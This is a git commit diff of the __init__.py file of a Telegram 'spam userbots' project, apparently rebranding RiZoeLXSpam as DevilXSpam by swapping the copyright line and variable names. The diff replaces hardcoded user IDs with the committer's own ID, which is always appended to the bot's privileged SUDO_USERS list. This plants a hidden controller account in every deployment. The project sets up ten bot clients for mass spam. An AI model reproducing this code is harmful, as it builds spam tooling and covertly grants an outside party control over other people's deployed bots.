bb28e42b0ff0fa8ba3615fb86d25e319f41140df
DevilBotz <110766400+DEVIL-BOTS@users.noreply.github.com>
2022-08-09 15:49:06 +0530

    Update and rename RiZoeLXSpam/__init__.py to DevilXSpam/__init__.py

--- DevilXSpam/__init__.py
+++ DevilXSpam/__init__.py
@@ -1,5 +1,5 @@
-# RiZoeLXSpam - Spam Userbots
-# Copyright © 2021 @RiZoeLX
+# DevilXSpam - Spam Userbots
+# Copyright © 2022 @DevilX
 
 import os
 import sys
@@ -18,7 +18,7 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 #version
 
-rizoelversion = "v2.0.3"
+Devilversion = "v2.0.3"
 
 #values
 API_ID = config("API_ID", default=None, cast=int)
@@ -40,34 +40,34 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 5062902521 not in SUDO_USERS:
+    SUDO_USERS.append(5062902521)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1789859817)
+SUDO_USERS.append(5062902521)
 
 # Tokens
 
-Riz = TelegramClient('Riz', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+Devil = TelegramClient('Devil', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-Riz2 = TelegramClient('Riz2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
+Devil2 = TelegramClient('Devil2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
 
-Riz3 = TelegramClient('Riz3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
+Devil3 = TelegramClient('Devil3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
 
-Riz4 = TelegramClient('Riz4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
+Devil4 = TelegramClient('Devil4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
 
-Riz5 = TelegramClient('Riz5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
+Devil5 = TelegramClient('Devil5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
 
-Riz6 = TelegramClient('Riz6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
+Devil6 = TelegramClient('Devil6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
 
-Riz7 = TelegramClient('Riz7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
+Devil7 = TelegramClient('Devil7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
 
-Riz8 = TelegramClient('Riz8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
+Devil8 = TelegramClient('Devil8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
 
-Riz9 = TelegramClient('Riz9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
+Devil9 = TelegramClient('Devil9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
 
-Riz10 = TelegramClient('Riz10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
+Devil10 = TelegramClient('Devil10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
